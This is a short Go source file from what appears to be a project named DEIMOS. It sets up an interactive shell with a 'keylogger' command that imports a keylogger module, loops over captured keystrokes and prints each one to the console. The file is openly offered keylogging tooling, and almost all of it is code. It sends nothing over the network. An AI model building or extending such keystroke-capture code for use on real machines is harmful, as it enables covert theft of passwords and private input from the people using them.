package shell

import (
	keylogger "github.com/MustaphaAlioglou/DEIMOS/util"
	"github.com/abiosoft/ishell"
	"os"
	"fmt"
	"time"
)
//GetShell gets a shell. Yes its that complex
func GetShell() {
	shell := ishell.New()
	shell.Println("WELCOME TO DEIMOS")
	shell.AddCmd(&ishell.Cmd{
		Name: "keylogger",
		Func: func(c *ishell.Context) {
			kl := keylogger.NewKeylogger()
			for {
				key := kl.GetKey()
				if !key.Empty {
					fmt.Printf("%c", key.Rune)
				}
				time.Sleep(5 * time.Millisecond)
			}
		},
		Help: "It's a keylogger",
	})
	if len(os.Args) > 1 && os.Args[1] == "exit" {
		shell.Process(os.Args[2:]...)
	} else {
		shell.Run()
		shell.Close()
	}
}
